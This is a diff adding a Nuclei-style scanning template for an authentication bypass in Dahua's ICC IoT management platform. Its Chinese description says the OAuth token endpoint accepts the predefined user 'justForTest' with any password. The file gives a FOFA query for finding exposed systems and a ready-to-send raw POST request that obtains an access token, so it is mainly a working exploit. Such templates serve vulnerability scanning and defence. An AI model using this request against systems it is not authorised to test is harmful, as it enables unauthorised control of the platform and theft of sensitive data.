@@ -1,0 +1,33 @@
+id: dahua-icc-justfortest-user-login-vuln
+
+info:
+  name: "大华智能物联综合管理平台ICC justForTest 身份验证绕过"
+  author: 0dayPoc
+  severity: high
+  description: |-
+    fofa: body="*客户端会小于800*"
+          浙江大华技术股份有限公司智能物联综合管理平台的/evo-apigw/evo-oauth/oauth/token认证接口存在身份验证缺陷。攻击者可通过预定义用户justForTest配合任意密码参数，绕过正常身份验证流程实现未授权访问。该漏洞允许远程攻击者获取系统控制权限并可能导致敏感数据泄露。
+  tags: 大华智能物联综合管理平台
+
+http:
+- raw:
+  - |
+    POST /evo-apigw/evo-oauth/oauth/token HTTP/1.1
+    Host: {{Hostname}}
+    Content-Type: application/x-www-form-urlencoded
+    Accept-Encoding: gzip
+    Connection: close
+
+    username=justForTest&password=1&grant_type=password&client_id=web_client&client_secret=web_client&public_key=
+  matchers-condition: and
+  matchers:
+  - type: status
+    status: [200]
+  - type: word
+    part: body
+    words:
+    - 'success'
+  - type: word
+    part: body
+    words:
+    - 'access_token'
